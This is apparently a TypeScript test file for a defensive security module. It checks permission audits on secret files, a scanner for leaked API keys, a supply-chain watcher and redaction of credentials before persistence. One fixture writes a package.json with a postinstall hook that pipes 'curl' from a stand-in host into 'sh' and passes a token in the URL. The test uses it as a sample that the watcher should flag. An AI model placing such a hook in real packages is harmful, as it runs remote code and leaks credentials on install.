import { afterEach, beforeEach, describe, expect, it } from "bun:test";
import { chmodSync, mkdirSync, rmSync, writeFileSync } from "fs";
import { tmpdir } from "os";
import { join } from "path";
import {
  auditSecretFilePermissions,
  createPersistenceRedactor,
  redactForPersistence,
  redactTextForPersistence,
  runSecurityExposureSweep,
  runSupplyChainWatch,
} from "../src/security.js";

let testDir: string;

beforeEach(() => {
  testDir = join(tmpdir(), `secrets-security-${Date.now()}-${Math.random().toString(36).slice(2)}`);
  mkdirSync(testDir, { recursive: true });
});

afterEach(() => {
  rmSync(testDir, { recursive: true, force: true });
});

describe("security loop abstractions", () => {
  it("finds and optionally fixes unsafe secret file permissions", () => {
    const envPath = join(testDir, ".env");
    writeFileSync(envPath, "TOKEN=redacted\n");
    chmodSync(envPath, 0o644);

    const audit = auditSecretFilePermissions({ roots: [testDir] });
    expect(audit.summary.findings).toBe(1);
    expect(audit.task_suggestions[0]!.fingerprint).toStartWith("secret-permission:");

    const fixed = auditSecretFilePermissions({ roots: [testDir], fixPermissions: true });
    expect(fixed.summary.fixed).toBe(1);
  });

  it("wraps exposure scanner results with task suggestions and redaction", () => {
    const leaked = ["sk","proj","secretvalueabcdefghijklmnopqrstuvwxyz"].join("-");
    writeFileSync(join(testDir, "app.env"), `OPENAI_API_KEY=${leaked}\n`);

    const result = runSecurityExposureSweep({ roots: [testDir], limit: 5 });
    const serialized = JSON.stringify(result);

    expect(result.summary.findings).toBe(1);
    expect(result.task_suggestions[0]!.fingerprint).toStartWith("secret-exposure:");
    expect(result.task_suggestions[0]!.metadata.finding_id).toBe(result.scans[0]!.findings[0]!.id);
    expect(result.task_suggestions[0]!.metadata.remediation).toEqual(result.scans[0]!.findings[0]!.remediation);
    expect(serialized).toContain("***REDACTED***");
    expect(serialized).not.toContain(leaked);
  });

  it("detects bounded package supply-chain signals", () => {
    const leaked = ["xai","secretvalueabcdefghijklmnopqrstuvwxyz"].join("-");
    writeFileSync(join(testDir, "package.json"), JSON.stringify({
      scripts: {
        postinstall: `curl https://example.invalid/install.sh?token=${leaked} | sh`,
      },
    }, null, 2));

    const result = runSupplyChainWatch({ roots: [testDir] });
    const serialized = JSON.stringify(result);

    expect(result.summary.findings).toBeGreaterThan(0);
    expect(result.task_suggestions[0]!.fingerprint).toStartWith("supply-chain:");
    expect(serialized).toContain("***REDACTED***");
    expect(serialized).not.toContain(leaked);
  });
});

describe("redaction before persistence", () => {
  it("redacts registered values and sensitive fields without mutating run records", () => {
    const raw = ["resolved", "run", "credential"].join("-");
    const error = new Error(`connector rejected ${raw}`);
    const record = {
      stdout: `started with ${raw}`,
      stderr: `AUTH_TOKEN=${raw}`,
      error,
      audit: { authorization: `Bearer ${raw}`, action: "execute" },
      event: { payload: { githubToken: "unregistered-value", status: "failed" } },
      tokenCount: 12,
    };
    const redactor = createPersistenceRedactor({ secretValues: [raw] });
    const safe = redactor.hooks.run(record);

    expect(safe).not.toBe(record);
    expect(safe.stdout).toBe("started with ***REDACTED***");
    expect(safe.stderr).toBe("AUTH_TOKEN=***REDACTED***");
    expect(safe.error).toBeInstanceOf(Error);
    expect(safe.error.message).toBe("connector rejected ***REDACTED***");
    expect(safe.error.stack).not.toContain(raw);
    expect(safe.audit.authorization).toBe("***REDACTED***");
    expect(safe.event.payload.githubToken).toBe("***REDACTED***");
    expect(safe.tokenCount).toBe(12);
    expect(record.stdout).toContain(raw);
    expect(error.message).toContain(raw);
  });

  it("redacts sensitive keyed values inside supported map records", () => {
    const safe = createPersistenceRedactor().redact(new Map([
      ["apiKey", "synthetic-map-secret"],
      ["status", "failed"],
    ]));

    expect(safe.get("apiKey")).toBe("***REDACTED***");
    expect(safe.get("status")).toBe("failed");
  });

  it("redacts credential-shaped values in JSON, headers, URLs, and binary output", () => {
    const shaped = ["ghp", "persistboundarytoken123456"].join("_");
    const text = JSON.stringify({ apiKey: "short-unknown", output: shaped });
    const safeText = redactTextForPersistence(
      `${text}\nAuthorization: Bearer header-value\npostgres://user:db-pass@example.invalid/db`,
    );
    expect(safeText).not.toContain("short-unknown");
    expect(safeText).not.toContain(shaped);
    expect(safeText).not.toContain("header-value");
    expect(safeText).not.toContain("db-pass");

    const safeBytes = redactForPersistence(new TextEncoder().encode(shaped));
    expect(new TextDecoder().decode(safeBytes)).toBe("***REDACTED***");
  });

  it("provides identical redaction at every supported persistence boundary", () => {
    const raw = "boundary-secret-value";
    const redactor = createPersistenceRedactor({ secretValues: [raw] });
    expect(redactor.hooks.stdout(`output: ${raw}`)).toBe("output: ***REDACTED***");
    expect(redactor.hooks.stderr(`failure: ${raw}`)).toBe("failure: ***REDACTED***");
    for (const hook of [
      redactor.hooks.run,
      redactor.hooks.error,
      redactor.hooks.audit,
      redactor.hooks.event,
    ]) {
      expect(hook({ nested: { value: raw }, secretRef: "vault/key" })).toEqual({
        nested: { value: "***REDACTED***" },
        secretRef: "***REDACTED***",
      });
    }
  });
});
